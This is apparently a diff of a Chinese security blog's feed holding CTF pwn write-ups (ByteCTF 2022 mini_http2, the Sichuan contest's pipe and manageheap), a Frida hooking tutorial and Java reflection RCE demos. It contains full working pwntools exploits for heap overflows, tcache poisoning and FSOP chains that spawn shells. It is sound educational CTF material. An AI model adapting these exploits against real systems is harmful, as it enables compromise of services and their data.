+        <title type="html"><![CDATA[ByteCTF2022-PWN-复现]]></title>
+        <id>https://kotoriseed.github.io/post/bytectf2022/</id>
+        <link href="https://kotoriseed.github.io/post/bytectf2022/">
+        </link>
+        <updated>2022-11-19T09:50:20.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>今年bytectf没来得及去打，但是题目质量是很高的，现在重新做一下当时的题</p>
+</blockquote>
+<h1 id="pwn">PWN</h1>
+<h2 id="mini_http2">mini_http2</h2>
+<h3 id="分析">分析</h3>
+<p>libc的版本是2.35，但是main函数的开头将<code>__free_hook</code>的地址存到了bss段上，有点东西。</p>
+<figure data-type="image" tabindex="1"><img src="https://img.le1a.com/2022/11/19/c8a1fa409c0b9.png" alt="1668849923953.png" loading="lazy"></figure>
+<p>交叉引用看了下，果然存在后门，如果将<code>system</code>的地址写入<code>__free_hook</code>中，就能执行<code>system(s1);</code></p>
+<figure data-type="image" tabindex="2"><img src="https://img.le1a.com/2022/11/19/178b1853c7e1a.png" alt="1668850053122.png" loading="lazy"></figure>
+<p>继续逆。发现在注册功能中，<code>s1</code>直接就是get传参传进来的<code>username</code>的值。</p>
+<figure data-type="image" tabindex="3"><img src="https://img.le1a.com/2022/11/19/0f4fa84f953bb.png" alt="1668850217566.png" loading="lazy"></figure>
+<p>登录功能也直接白给了libc上的地址，</p>
+<figure data-type="image" tabindex="4"><img src="https://img.le1a.com/2022/11/19/d7d4512850bdb.png" alt="1668850305271.png" loading="lazy"></figure>
+<p>比较要命的地方来了。post和get传参逆的时候其实都还不算累，但是审管理堆块的功能时，发现他对表达式的解析有一点诡异（可能只是我之前没见过，熟练的师傅都一眼顶针了）</p>
+<p><code>sub_2EB9</code>函数中对postdata的解析极其复杂，以至于我逆了相当长一段时间。然后发现，这不就是json的格式吗（捂脸哭）</p>
+<p>下面来看一下用得上的功能：</p>
+<ul>
+<li><strong>add_worker:</strong></li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://img.le1a.com/2022/11/19/f53effa8b1b64.png" alt="1668850636058.png" loading="lazy"></figure>
+<p>使用的是<code>strdup</code>来调用<code>malloc</code>创建堆块，大小控制在0x110以内，数量最多16个，创建完成过后会白给堆上的指针。</p>
+<ul>
+<li><strong>del_worker:</strong></li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://img.le1a.com/2022/11/19/4d25c557be4f5.png" alt="1668850849248.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://img.le1a.com/2022/11/19/ae0d8edc87c52.png" alt="1668850889535.png" loading="lazy"></figure>
+<p>删除功能中不存在直接的uaf</p>
+<ul>
+<li><strong>edit_worker:</strong></li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://img.le1a.com/2022/11/19/b57f6c9ceb4ff.png" alt="1668850969805.png" loading="lazy"></figure>
+<p>问题主要就出在这个功能中，直接使用<code>memcpy</code>将传入的数据拷贝到指定堆块中去，并没有和创建时的大小进行比较。所以是存在堆溢出的，但是由于判断长度使用的是<code>strlen</code>，所以payload会被<code>\x00</code>截断。</p>
+<p>接下来就是构造堆溢出，劫持tcache bin的链表，整个过程并不复杂，但由于该题在处理协议的时候使用了大量的<code>malloc</code>和<code>free</code>，所以堆布局相对来说十分混乱，需要注意一下。且版本是2.35，在tcache bin和fastbin的单链表中都有宏去保护指针，需要处理一下。</p>
+<p>（逆协议的过程就省去了，有不理解的地方的话可以参考exp来理解，或者直接联系我）</p>
+<h3 id="exp">exp</h3>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+
+p = process('./mini_http2')
+elf = ELF('./mini_http2')
+libc = elf.libc
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa  = lambda x,y : p.sendafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p)
+	raw_input()
+
+def get(url):
+	pay = b'\x00' + p16(len(url)+7)[::-1] + b'\x01\x05'
+	pay = pay.ljust(0x9, b'\x00')
+	p.send(pay)
+	pay = b'\x82\x86\x44' + p32(len(url))[::-1]
+	pay += url
+	p.send(pay)
+
+def post(url, postdata):
+	pay = b'\x00' + p16(len(url)+7)[::-1] + b'\x01\x05'
+	pay = pay.ljust(0x9, b'\x00')
+	p.send(pay)
+	pay = b'\x83\x86\x44' + p32(len(url))[::-1]
+	pay += url
+	p.send(pay)
+	pay = b'\x00' + p16(len(postdata))[::-1]
+	pay = pay.ljust(0x9, b'\x00')
+	p.send(pay)
+	p.send(postdata)
+
+def add_worker(name, desc):
+	pay = b'{&quot;name&quot;: &quot;' + name + b'&quot;, '
+	pay += b'&quot;desc&quot;: &quot;' + desc + b'&quot;}'
+	post(b'/api/add_worker', pay)
+
+def del_worker(idx):
+	pay = b'{&quot;worker_idx&quot;: ' + idx + b' }'
+	post(b'/api/del_worker', pay)
+
+def edit_worker(name, desc, idx):
+	pay = b'{&quot;name&quot;: &quot;' + name + b'&quot;, '
+	pay += b'&quot;desc&quot;: &quot;' + desc + b'&quot;,'
+	pay += b'&quot;worker_idx&quot;: ' + idx + b' }'
+	post(b'/api/edit_worker', pay)
+
+get(b'/register?username=/bin/sh&amp;password=kotori')
+get(b'/login?username=/bin/sh&amp;password=kotori')
+
+ru('\'gift\': &quot;0x')
+libcbase = int(ru('}')[:-2], 16) - 0xc4200
+# print(hex(libcbase))
+hook = libcbase + libc.symbols['__free_hook']
+system = libcbase + libc.symbols['system']
+
+add_worker(b'1'*0x80, b'2'*0x80) # 0
+ru('name_addr&quot;: &quot;0x')
+heapbase = int(ru('&quot;')[:-1], 16) - 0x800
+# print(hex(heapbase))
+
+add_worker(b'3'*0x80, b'4'*0x80) # 1
+add_worker(b'5'*0x80, b'6'*0x80) # 2
+del_worker(b'1')
+del_worker(b'2')
+
+add_worker(b'7'*0x80, b'8'*0x8) # 1
+add_worker(b'9'*0x80, b'a'*0x8) # 2
+add_worker(b'b'*0x80, b'c'*0x8) # 3
+add_worker(b'd'*0x80, b'e'*0x8) # 4
+del_worker(b'2')
+del_worker(b'4')
+
+pay = b'a'*0x90 + p64(((heapbase+0xa00)&gt;&gt;12)^(hook-0x78))[:6]
+edit_worker(pay, b'kotori', b'3')
+
+add_worker(b'9'*0x80, b'a'*0x8) # 2
+pay = b'a'*0x78 + p64(system)[:6]
+add_worker(pay, b'a'*0x8) # 4
+
+get(b'/exit')
+
+# g()
+
+p.interactive()
+</code></pre>
+<p>（待续）</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[2022年"深信服"杯-四川省赛-PWN-WP]]></title>
+        <id>https://kotoriseed.github.io/post/2022四川省赛/</id>
+        <link href="https://kotoriseed.github.io/post/2022四川省赛/">
+        </link>
+        <updated>2022-11-12T14:25:26.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>第一次参加省赛，而且状态不是很好。一题3血一题2血，中规中矩的成绩吧。不过可惜的是和一等奖无缘了</p>
+</blockquote>
+<h1 id="pipe">pipe</h1>
+<h2 id="分析">分析</h2>
+<p>开幕雷击。考虑思路为在<code>./ctf.sh</code>中写入<code>/bin/sh</code>来getshell</p>
+<figure data-type="image" tabindex="1"><img src="https://img.le1a.com/2022/11/12/379c452516268.png" alt="1668262407288.png" loading="lazy"></figure>
+<p>然后简单回溯一下写入过程：</p>
+<ul>
+<li>最开始的时候创建一个<code>./ctf.sh</code>，</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://img.le1a.com/2022/11/12/c6e8734ec37ad.png" alt="1668262727091.png" loading="lazy"></figure>
+<ul>
+<li>将<code>/bin/sh</code>写入<code>buffer</code>，</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://img.le1a.com/2022/11/12/7ade1c8bf08d8.png" alt="1668262660790.png" loading="lazy"></figure>
+<ul>
+<li>将buffer写入<code>./ctf.sh</code>，</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://img.le1a.com/2022/11/12/542e82cd101f5.png" alt="1668262615222.png" loading="lazy"></figure>
+<ul>
+<li>触发后门</li>
+</ul>
+<h2 id="exp">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sys
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+port = int(sys.argv[1])
+if port == 0:
+	p = process('./pipe')
+else:
+	p = remote('172.16.159.59', port)
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa  = lambda x,y : p.sendafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p, arg)
+	raw_input()
+
+def choice(idx):
+	sla('cmd&gt;&gt;&gt;', str(idx))
+
+sla('path&gt;', './ctf.sh')
+choice(2)
+sla('size&gt;', '10')
+sla('put&gt;', '/bin/sh')
+
+choice(5)
+choice(6)
+
+p.interactive()
+</code></pre>
+<h1 id="manageheap">manageheap</h1>
+<h2 id="分析-2">分析</h2>
+<p>2.35下的堆题，洞在修改堆块的功能里，可以off by one（实际上是溢出8bytes）</p>
+<figure data-type="image" tabindex="5"><img src="https://img.le1a.com/2022/11/12/9553c01011ebe.png" alt="1668261344195.png" loading="lazy"></figure>
+<p>add的时候先开了一个0x30的chunk来管理一个major，结构体大概如下：</p>
+<pre><code class="language-c">struct manageHeap{
+	char name[0x10];
+    intprt_t *data;
+    int data_len;
+};
+</code></pre>
+<p>且最大只能申请到0x290的chunk。</p>
+<figure data-type="image" tabindex="6"><img src="https://img.le1a.com/2022/11/12/48a56956ded0e.png" alt="1668261477937.png" loading="lazy"></figure>
+<p>由于读写都是从0x31的堆块上获取的，所以利用off by one造一个overlap，通过不断释放和申请chunk A，修改被重叠的chunk B中的data指针，就能达到任意地址读写了。（造overlap时是partial overwrite了一个data指针，所以远程是<code>1/16</code>的概率打通，本地调试时可以先关掉alsr）</p>
+<p>leak堆基址很简单，但是leak libc基址就有点被限制。因为最大只能申请到0x290，不足以直接绕过tcache bin，且堆块限制了7个，也没法正常填满tcache bin来进unsorted bin。所以这里我还打了一次size，让一个chunk的大小变成能直接进入unsorted bin的大小。</p>
+<p>而且由于这题无法从main退出，也无<code>exit</code>（<code>_exit</code>是不会触发<code>__IO_flush_all_lockp</code>的），所以考虑用<code>house of kiwi</code>，通过<code>__malloc_assert</code>来劫持控制流。</p>
+<p>我这里是打的<code>stderr-&gt;_IO_file_xsputn</code>，走<code>house of apple2</code>这条链子，然后由于没开沙箱，所以简单syscall调用一下<code>execve('/bin/sh', 0, 0)</code>。（不用<code>system</code>是因为栈大小不好预留）</p>
+<p>至于为什么打<code>__malloc_assert</code>也能稳定触发<code>stderr-&gt;_IO_file_xsputn</code>，可以参考一下源码：</p>
+<pre><code class="language-c">static void
+__malloc_assert (const char *assertion, const char *file, unsigned int line,
+		 const char *function)
+{
+  (void) __fxprintf (NULL, &quot;%s%s%s:%u: %s%sAssertion `%s' failed.\n&quot;,
+		     __progname, __progname[0] ? &quot;: &quot; : &quot;&quot;,
+		     file, line,
+		     function ? function : &quot;&quot;, function ? &quot;: &quot; : &quot;&quot;,
+		     assertion);
+  fflush (stderr);
+  abort ();
+}
+</code></pre>
+<p>这里在<code>__fxprintf</code>内部调用的是<code>stderr-&gt;_IO_file_xsputn</code>，且此方法应该能适用于接下来libc-2.36里删除了<code>fflush(stderr)</code>后的<code>__malloc_assert</code>，而且劫持<code>stderr</code>，一般情况下不会出问题，比劫持<code>stdout</code>要稳定。</p>
+<h2 id="exp-2">exp</h2>
+<pre><code class="language-python">from pwn import *
+import sys
+context.log_level = 'debug'
+context.arch = 'amd64'
+
+port = int(sys.argv[1])
+if port == 0:
+	p = process('./manageheap')
+else:
+	p = remote('172.16.159.59', port)
+
+elf = ELF('./manageheap')
+libc = elf.libc
+
+sla = lambda x,y : p.sendlineafter(x,y)
+sa  = lambda x,y : p.sendafter(x,y)
+ru  = lambda x   : p.recvuntil(x)
+
+def g(arg=''):
+	gdb.attach(p, arg)
+	raw_input()
+
+def choice(idx):
+	sla('ice: ', str(idx))
+
+def add(num, name='kotori', content='saoe'):
+	choice(1)
+	sla('ber:', str(num))
+	sa('name:', name)
+	sa('&gt; ', content)
+
+def delete(idx):
+	choice(2)
+	sla('idx:', str(idx))
+
+def show(idx):
+	choice(3)
+	sla('idx:', str(idx))
+
+def edit(idx, buf, content):
+	choice(4)
+	sla('idx:', str(idx))
+	sa('id:', buf)
+	p.send(content)
+
+add(0x68//8) # 0
+
+add(0x28//8) # 1
+add(0x200//8) # 2
+add(0x200//8) # 3
+
+delete(0)
+pay = p64(0xbaadf00d)*(0x68//8)
+add(0x68//8, 'kotori', pay) # 0
+
+edit(0, p64(0x31), p64(0x31+0x30))
+delete(1)
+add((0x28)//8) # 1
+
+pay = b'a'*0x28 + p64(0x31) + b'a'*0x10 + b'\xc0\x93' # partial overwrite
+add((0x58)//8, 'kotori', pay) # 4
+
+edit(1, p64(0x211), p64(0x211+0x30+0x210))
+delete(2) # unsorted
+delete(4)
+
+pay = b'a'*0x28 + p64(0x31) + b'a'*0x10 + b'\xd0'
+add((0x58)//8, 'kotori', pay) # 4
+show(1)
+
+ru('ber: ')
+libcbase = u64(p.recvline()[:-1].ljust(0x8, b'\x00')) - 0x219ce0
+print(hex(libcbase))
+
+delete(4)
+pay = b'a'*0x28 + p64(0x31) + b'd'*0x10 + b'\xa0'
+add((0x58)//8, 'kotori', pay) # 2
+show(1)
+
+ru('a'*0x10)
+heapbase = u64(p.recvline()[:-1].ljust(0x8, b'\x00')) - 0x3d0
+print(hex(heapbase))
+
+# stderr -&gt; _IO_file_xsputn
+
+stderr = libcbase + 0x21a6a0
+_wfile_jumps = libcbase + 0x2160c0 # _IO_wfile_overflow
+setcontext = libcbase + libc.symbols['setcontext']
+# sys = libcbase + libc.symbols['system']
+ret = libcbase + 0x000000000002a3e5 + 1
+pop_rax = libcbase + 0x0000000000045eb0 # pop rax ; ret
+syscall = libcbase + 0x0000000000029db4 # syscall
+
+pay = b'/bin/sh\x00'
+pay = pay.ljust(0x68, b'\x00')
+pay += p64(heapbase+0x460) # rdi
+pay = pay.ljust(0xa0, b'\x00')
+pay += p64(heapbase+0x880) # rsp
+pay += p64(ret) # rcx -&gt; rip
+pay = pay.ljust(0xe0, b'\x00')
+pay += p64(heapbase+0x880)
+add((0x200//8), 'kotori', pay) # 5 (0x460) # wide_data &amp; SigreturnFrame
+pay = p64(pop_rax) + p64(59) + p64(syscall)
+pay = pay.ljust(0x68, b'\x00')
+pay += p64(setcontext+61)
+add((0x200//8), 'kotori', pay) # 6 (0x880) # wide_data_vtable &amp; rop
+
+delete(2)
+pay = b'a'*0x28 + p64(0x31) + b'd'*0x10 + p64(stderr+0xd8) + p64(0xff0)
+add((0x58)//8, 'kotori', pay) # 2
+
+# g()
+edit(1, p64(libcbase+0x216600), p64(_wfile_jumps-0x20)) # attack vtable
+
+delete(2)
+pay = b'a'*0x28 + p64(0x31) + b'd'*0x10 + p64(stderr) + p64(0xff0)
+add((0x58)//8, 'kotori', pay) # 2
+
+edit(1, p64(libcbase+0x2198a0), p64(heapbase+0x460)) # attack _wide_data
+
+delete(2)
+pay = b'a'*0x28 + p64(0x31) + b'd'*0x10 + p64(stderr) + p64(0xff0)
+add((0x58)//8, 'kotori', pay) # 2
+
+edit(1, p64(0xfbad2087), p64(0)) # attack _flags
+
+delete(2)
+pay = b'a'*0x28 + p64(0x31) + b'd'*0x10 + p64(heapbase+0xa80) + p64(0xff0)
+add((0x58)//8, 'kotori', pay) # 2
+
+edit(1, p64(0x20581), p64(0x80)) # attack top_size
+
+delete(2)
+
+choice(1)
+sla('number:', '64')
+
+p.interactive()
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Frida Hook初探]]></title>
+        <id>https://kotoriseed.github.io/post/frida hook/</id>
+        <link href="https://kotoriseed.github.io/post/frida hook/">
+        </link>
+        <updated>2022-10-18T12:13:57.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前置">前置</h1>
+<h2 id="安装环境">安装环境</h2>
+<p>想要快乐地进行frida hook，就需要先准备好一部安卓机（最好是真机）和adb环境，这一部分就不细说了。</p>
+<p>安装frida的话，先在<code>https://github.com/frida/frida/releases</code>找好一个版本，然后下载手机对应架构的<code>frida-server</code></p>
+<p>比如我这里是</p>
+<figure data-type="image" tabindex="1"><img src="https://img.le1a.com/2022/10/18/e49e882049d3e.png" alt="1666094521765.png" loading="lazy"></figure>
+<p>所以选择下载了<code>frida-server-16.0.1-android-arm64</code></p>
+<p>然后使用<code>adb push ./frida-server-16.0.1-android-arm64 /data/local/tmp/</code>将这个binary传到手机里</p>
+<figure data-type="image" tabindex="2"><img src="https://img.le1a.com/2022/10/18/06f5ae90af279.png" alt="1666094632332.png" loading="lazy"></figure>
+<p>这样就是上传成功了，要用的时候只需要在adb起的shell中cd过去然后运行一下就行了（记得给运行权限）</p>
+<p>在PC端用pip装一下frida这个库（frida版本要和安卓上的一样）</p>
+<pre><code class="language-shell">pip install frida-16.0.1.dev7-cp34-abi3-win_amd64.whl
+pip install frida-tools
+</code></pre>
+<p>装好之后可以<code>frida-ps -U</code>测试一下</p>
+<figure data-type="image" tabindex="3"><img src="https://img.le1a.com/2022/10/18/2a9714cb5168e.png" alt="1666094885743.png" loading="lazy"></figure>
+<p>这样就是正常工作了</p>
+<h2 id="测试环境">测试环境</h2>
+<p>简单测试一下脚本的使用</p>
+<ul>
+<li>test.py</li>
+</ul>
+<pre><code class="language-python">import frida
+# print(frida.__version__)
+device = frida.get_usb_device()
+session = device.attach(22576)
+
+print(device)
+print(session)
+
+with open(&quot;./hook.js&quot;) as f:
+    script = session.create_script(f.read())
+script.load()
+
+input()
+</code></pre>
+<ul>
+<li>hook.js</li>
+</ul>
+<pre><code class="language-javascript">console.log(&quot;hook success!&quot;)
+Java.perform(
+    function x(){
+        console.log(&quot;Inside java perform function&quot;)
+    }
+)
+</code></pre>
+<ul>
+<li>运行结果</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://img.le1a.com/2022/10/18/4f0cd2355d411.png" alt="1666095085571.png" loading="lazy"></figure>
+<h1 id="利用">利用</h1>
+<h2 id="对原有方法进行覆盖">对原有方法进行覆盖</h2>
+<h3 id="例题001">例题001</h3>
+<p>NewstarCTF上的一题，先把apk装到安卓机上</p>
+<pre><code class="language-shell">adb install ./apk.apk
+</code></pre>
+<p>浅浅运行一下</p>
+<figure data-type="image" tabindex="5"><img src="https://img.le1a.com/2022/10/18/3871f7c87d542.png" alt="1666097355808.png" loading="lazy"></figure>
+<p>发现貌似逻辑不在<code>MainActivity</code>里，jadx打开果然发现了<code>FlagActivity</code></p>
+<p>所以需要指定加载到这里面来运行，在adb起的shell中执行</p>
+<pre><code>am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivity
+</code></pre>
+<p>然后就能看到进入了这个地方，但是需要点击10000次才能拿到flag，有点小离谱（）</p>
+<figure data-type="image" tabindex="6"><img src="https://img.le1a.com/2022/10/18/2c8e8a405282b.png" alt="1666097661740.png" loading="lazy"></figure>
+<p>这里就可以用到frida来hook一下这个方法了</p>
+<p><code>FlagActivity</code>的源码在jadx中可以看到是这样的（图片不清楚的话可以放大看）</p>
+<figure data-type="image" tabindex="7"><img src="https://img.le1a.com/2022/10/18/c77f0ef108e60.png" alt="1666101531148.png" loading="lazy"></figure>
+<p>其中比较重要的片段是</p>
+<pre><code class="language-java">...
+private int cnt = 0;
+static int access$004(FlagActivity flagActivity) {
+	int i = flagActivity.cnt + 1;
+    flagActivity.cnt = i;
+    return i;
+}
+...
+public void onCreate(Bundle bundle) {
+...
+	public void onClick(View view) {
+		textView.setText(Integer.toString(FlagActivity.access$004(FlagActivity.this)));
+    	if (FlagActivity.this.cnt &gt;= 10000) {
+        	Toast.makeText(FlagActivity.this, editText.getText().toString(), 0).show();
+    	}
+	}
+...
+}
+</code></pre>
+<p>每次监听到点击事件过后，就会使用<code>access$004</code>方法对<code>cnt</code>变量进行递增，并打印在屏幕上</p>
+<p>那么我们可以hook到java层，重新实现<code>access$004</code>这个方法，让返回值直接大于10000</p>
+<ul>
+<li>hook.js</li>
+</ul>
+<pre><code class="language-javascript">Java.perform(
+    function () {
+        console.log(&quot;Inside java perform function&quot;);
+        console.log(&quot;process pid = &quot; + Process.id);
+        var my_class = Java.use(&quot;com.droidlearn.activity_travel.FlagActivity&quot;);
+        //console.log(my_class.access$004)
+        my_class.access$004.implementation= function (x){
+            console.log(&quot;cnt=&quot; + x.cnt.value);
+            x.cnt.value = 10001;
+            console.log(&quot;cnt=&quot; + x.cnt.value);
+            return 10001;
+        }
+    }
+);
+</code></pre>
+<ul>
+<li>exp.py</li>
+</ul>
+<pre><code class="language-python">import frida
+
+device = frida.get_usb_device()
+session = device.attach(4180)
+
+print(device)
+print(session)
+
+with open(&quot;./hook.js&quot;) as f:
+    script = session.create_script(f.read())
+script.load()
+
+input()
+</code></pre>
+<p>成功修改cnt为10001，拿到flag</p>
+<figure data-type="image" tabindex="8"><img src="https://img.le1a.com/2022/10/18/680c21344fbb2.png" alt="1666101428084.png" loading="lazy"></figure>
+<h2 id="通过类名获取实例">通过类名获取实例</h2>
+<h3 id="例题001-resolve">例题001-REsolve</h3>
+<p>这里使用<code>Java.choose(完整类名)</code>的方法来解<code>例题001</code></p>
+<ul>
+<li>hook.js</li>
+</ul>
+<pre><code class="language-javascript">// Java.perform方法：当 js 附加到目标的进程中时被执行，运行其中定义的函数
+// Java.choose方法：通过完整类名，获取它的实例，从而对实例中的数据进行修改
+// onMatch 对应的函数在命中一个实例的时候被调用，传入函数中的参数 instance 就是被命中的实例
+// onComplete 函数会在所有实例遍历完毕之后被调用，可以做一些后续处理操作
+Java.perform(
+    function () {
+        console.log(&quot;Inside java perform function&quot;);
+        console.log(&quot;process pid = &quot; + Process.id);
+        var my_class = Java.use(&quot;com.droidlearn.activity_travel.FlagActivity&quot;);
+        //console.log(my_class.access$004)
+        // my_class.access$004.implementation= function (x){
+        //     console.log(&quot;cnt=&quot; + x.cnt.value);
+        //     x.cnt.value = 10001;
+        //     console.log(&quot;cnt=&quot; + x.cnt.value);
+        //     return 10001;
+        // }
+
+        Java.choose(&quot;com.droidlearn.activity_travel.FlagActivity&quot;,{
+            onMatch:function(instance){
+                console.log(&quot;cnt = &quot; + instance.cnt.value);
+                instance.cnt.value = 114514;
+                console.log(&quot;cnt = &quot; + instance.cnt.value);
+            },
+            onComplete:function(){
+                console.log(&quot;finish&quot;)
+            }
+        });
+    }
+);
+</code></pre>
+<ul>
+<li>exp.py</li>
+</ul>
+<pre><code class="language-python">import frida
+
+device = frida.get_usb_device()
+session = device.attach(4180)
+
+print(device)
+print(session)
+
+with open(&quot;./hook.js&quot;) as f:
+    script = session.create_script(f.read())
+script.load()
+
+input()
+</code></pre>
+<p>依然可以成功</p>
+<figure data-type="image" tabindex="9"><img src="https://img.le1a.com/2022/10/18/449bfeec59b85.png" alt="1666102717859.png" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Java Security(I) Reflection]]></title>
+        <id>https://kotoriseed.github.io/post/java security/</id>
+        <link href="https://kotoriseed.github.io/post/java security/">
+        </link>
+        <updated>2022-08-30T04:27:59.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>Java安全可以从反序列化漏洞开始说起，反序列化漏洞⼜可以从反射开始说起。					——phith0n</p>
+</blockquote>
+<h1 id="简介">简介</h1>
+<p>对于java安全而言，反射是一个很重要的基础知识。我们可以通过对对象的反射来获得某一个Class，也可以通过对Class的反射获得他的所有方法（包括私有）。</p>
+<p>在一些只有难以利用的基本类型对象(String, Char, Integer, ...)的情况下，利用反射获取到某些可以加以利用的Class 往往是一个不错的利用手段。</p>
+<h1 id="exploitaion">Exploitaion</h1>
+<h2 id="反射中常用的方法">反射中常用的方法</h2>
+<ul>
+<li>
+<p><code>forName</code>获取类</p>
+<ul>
+<li>参数需要是目标Class的全名</li>
+</ul>
+</li>
+<li>
+<p><code>newInstance</code>实例化一个对应Class的对象</p>
+<ul>
+<li>在目标类拥有无参构造函数的时候不需要参数即可使用</li>
+</ul>
+</li>
+<li>
+<p><code>getMethod</code>获取对应Class的某个方法</p>
+</li>
+<li>
+<p><code>invoke</code>执行方法</p>
+<ul>
+<li>一般来说至少会有一个参数，是使用这个方法的对象，后续参数是对于方法需要的参数</li>
+</ul>
+</li>
+</ul>
+<h2 id="利用反射获取class">利用反射获取Class</h2>
+<ul>
+<li>如果上文存在对应Class的对象<code>obj</code>，那么直接使用<code>obj.getClass()</code>方法即可。</li>
+<li>通常来说不会存在对应的对象，所以需要用到<code>Class.forName(&quot;target-class-name&quot;)</code>来获取到目标类</li>
+</ul>
+<p>（其实如果已经加载了某个类，比如说<code>Test</code>，是可以直接使用<code>Test.class</code>来拿到这个类的，不过此方法不属于反射就是了。而且通过此方法来获取对某个类的引用的时候，是不会触发类加载器(<code>ClassLoader</code>)对他的初始化操作的，而通过<code>forName</code>来引用时则会默认触发，这事实上和<code>forName</code>方法的一个重载有关）</p>
+<p>只是说的话比较枯燥，下面来看几个demo理解一下吧：</p>
+<h3 id="demo1-使用objgetclass">demo1-使用obj.getClass()</h3>
+<p><code>reflection</code>类的内容如下（后续demo也会基于这个类来示范）:</p>
+<pre><code class="language-java">public class reflection {
+    public void hello(){
+        System.out.println(&quot;hello!&quot;);
+    }
+    private void secret(){
+        System.out.println(&quot;You find me!!&quot;);
+    }
+}
+</code></pre>
+<p>现在我们要用反射获取到他的类，并使用他的hello方法。</p>
+<pre><code class="language-java">import java.lang.reflect.Method;
+
+public class test {
+    public static void main(String[] args) throws  Exception {
+        reflection a = new reflection();
+        a.hello();
+        Class ref = a.getClass();
+        ref.getMethod(&quot;hello&quot;).invoke(a);
+    }
+}
+</code></pre>
+<p>由于hello方法是公有的，所以这里使用了两种方法来调用它。</p>
+<h3 id="demo2-使用forname">demo2-使用forName()</h3>
+<p>在上下文没有<code>reflection</code>类的时候也能够调用他的方法。</p>
+<pre><code class="language-java">import java.lang.reflect.Method;
+
+public class test {
+    public static void main(String[] args) throws  Exception {
+        Class ref = Class.forName(&quot;reflection&quot;);
+        ref.getMethod(&quot;hello&quot;).invoke(ref.newInstance());
+    }
+}
+</code></pre>
+<h3 id="demo3-对私有方法的反射">demo3-对私有方法的反射</h3>
+<p>在<code>reflection</code>类中还有一个私有方法<code>secret()</code>，我们无法使用<code>getMethod</code>来获取到他。</p>
+<p>此时就可以使用<code>getDeclaredMethod</code>方法强行获取，然后再用<code>setAccessible(true)</code>赋予执行权限。</p>
+<pre><code class="language-java">import java.lang.reflect.Method;
+
+public class test {
+    public static void main(String[] args) throws  Exception {
+        Class ref = Class.forName(&quot;reflection&quot;);
+        Method secr = ref.getDeclaredMethod(&quot;secret&quot;);
+        secr.setAccessible(true);
+        secr.invoke(ref.newInstance());
+    }
+}
+</code></pre>
+<p>(我这里使用的是<code>jdk 8u341</code>，此方法在高版本可能并不适用)</p>
+<h2 id="浅谈利用反射的rce思路">浅谈利用反射的RCE思路</h2>
+<h3 id="使用forname反射javalangruntime类">使用forName反射java.lang.Runtime类</h3>
+<p>在<code>java.lang.Runtime</code>类中有<code>exec</code>方法，可以直接使用一些系统命令。</p>
+<p>不过要注意的是<code>java.lang.Runtime</code>类在设计上使用的是单例模式，我们想使用<code>invoke</code>的时候还需要传一个该类型的对象进去，此时<code>newInstance</code>方法是无法使用的。所以还需要先反射得到<code>getRuntime</code>这个方法来获取一个对象。</p>
+<pre><code class="language-java">import java.lang.reflect.Method;
+
+public class test {
+    public static void main(String[] args) throws  Exception {
+        Class runtime = Class.forName(&quot;java.lang.Runtime&quot;);
+        Method getruntime = runtime.getMethod(&quot;getRuntime&quot;);
+        Object obj = getruntime.invoke(runtime);
+        runtime.getMethod(&quot;exec&quot;, String.class).invoke(obj, &quot;calc.exe&quot;);
+    }
+}
+</code></pre>
+<p>运行成功将弹出计算器。</p>
+<figure data-type="image" tabindex="1"><img src="https://img.le1a.com/2022/08/30/4f6e1f1152efd.png" alt="1661870901546.png" loading="lazy"></figure>
+<h3 id="无默认无参构造函数下的利用">无默认无参构造函数下的利用</h3>
+<p><code>java.lang.Runtime</code>类的情况也是无法使用<code>newInstance</code>的，此时我们可以用<code> getConstructor</code>来反射。</p>
+<p>和<code>getMethod</code>类似， <code>getConstructor </code>接收的参数是构造函数列表类型，因为构造函数也支持重载，<br>
+所以必须用参数列表类型才能唯一确定一个构造函数。</p>
+<p>此外，<code>java.lang.ProcessBuilder</code>也是一种常用于RCE的函数，这里用它做一个示范</p>
+<pre><code class="language-java">import java.lang.reflect.Method;
+
+public class test {
+    public static void main(String[] args) throws  Exception {
+        Class pb = Class.forName(&quot;java.lang.ProcessBuilder&quot;);
+        ((ProcessBuilder)pb.getConstructor(String[].class).newInstance(new String[][]{{&quot;calc.exe&quot;}})).start();
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://img.le1a.com/2022/08/30/1717f83abdb70.png" alt="1661871587238.png" loading="lazy"></figure>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[AWD/AWDP-PWN-FIX]]></title>
+        <id>https://kotoriseed.github.io/post/awdp-pwn-fix/</id>
+        <link href="https://kotoriseed.github.io/post/awdp-pwn-fix/">
+        </link>
+        <updated>2022-08-25T02:13:16.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="safeparse">SafeParse</h1>
+<h2 id="fix">fix</h2>
+<figure data-type="image" tabindex="1"><img src="https://img.le1a.com/2022/08/23/7c997a636151c.png" alt="1661246926024.png" loading="lazy"></figure>
+<p>main函数的跳表没法正常识别，把这个<code>jmp rax</code>给改成<code>jmp eax</code>过后再f5就正常了。</p>
